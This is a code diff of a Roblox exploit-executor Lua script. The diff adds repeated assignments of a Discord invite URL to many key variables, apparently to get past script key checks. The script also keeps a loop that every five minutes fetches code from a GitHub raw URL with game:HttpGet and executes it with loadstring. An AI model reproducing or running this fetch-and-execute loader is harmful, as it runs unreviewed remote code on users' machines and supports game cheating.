@@ -1,4 +1,18 @@
 while wait(300) do
-    print("Check And Turn On Anti Tamper")
+    getgenv().Key = "https://discord.gg/FcEGmkNDDe"
+    getgenv().id = "https://discord.gg/FcEGmkNDDe"
+    getgenv().Key = "https://discord.gg/FcEGmkNDDe" 
+    _G.Key = "https://discord.gg/FcEGmkNDDe"
+    _G.DiscordId = "https://discord.gg/FcEGmkNDDe"
+    _G.MY_KEY_IS = "https://discord.gg/FcEGmkNDDe"
+    script_key = "https://discord.gg/FcEGmkNDDe";
+    script_key="https://discord.gg/FcEGmkNDDe";
+    getgenv().Keys = "https://discord.gg/FcEGmkNDDe"
+    script_key ='https://discord.gg/FcEGmkNDDe'
+    script_key = "https://discord.gg/FcEGmkNDDe"
+    _G.Key = 'https://discord.gg/FcEGmkNDDe'
+    _G.DiscordId  = 'https://discord.gg/FcEGmkNDDe'
+    getgenv().key = 'https://discord.gg/FcEGmkNDDe'
+    _G.Authorize = 'https://discord.gg/FcEGmkNDD'
     loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Anti%20Tamper%20X1"))()
 end
